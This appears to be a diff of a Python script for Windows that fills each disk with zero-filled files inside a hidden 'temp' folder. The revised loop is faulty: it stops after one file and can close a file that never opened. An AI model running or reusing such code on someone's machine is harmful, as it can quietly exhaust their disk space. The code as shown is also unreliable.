@@ -10,7 +10,8 @@ import win32api
 import win32con
 import string
 
-file_size = 4 * 1024 * 1024 * 1024
+file_size = 1 * 1024 * 1024 * 1024
+block_size=1*1024*1024
 disk_used = collections.OrderedDict()
 
 
@@ -36,7 +37,8 @@ def get_disk_info():
     return disk_used
 
 
-def work(disk, path='temp'):
+def work(disk,free_size=1024*1024*1024*1024,path='temp'):
+
     work_path = os.path.join(disk, path)
     if os.path.exists(work_path):
         pass
@@ -45,13 +47,17 @@ def work(disk, path='temp'):
     win32api.SetFileAttributes(work_path, win32con.FILE_ATTRIBUTE_NORMAL)
     win32api.SetFileAttributes(work_path, win32con.FILE_ATTRIBUTE_HIDDEN)
 
-    file_num = 63973105664 // file_size
-    last = 63973105664 % file_size
-    count = 0
-    while count < file_num:
-        with open(os.path.join(work_path, get_filename()), 'wb') as f:
-            f.write(b'0' * file_size)
-        count = count + 1
+    while free_size > 0:
+        try:
+            f=open(os.path.join(work_path, get_filename()), 'wb')
+            for i in range(0,1024):
+                f.write(b'0' * block_size)
+            free_size -= file_size
+        except Exception as e:
+            print(e)
+        finally:
+            f.close()
+            free_size=-1
 
 
 get_disk_info()
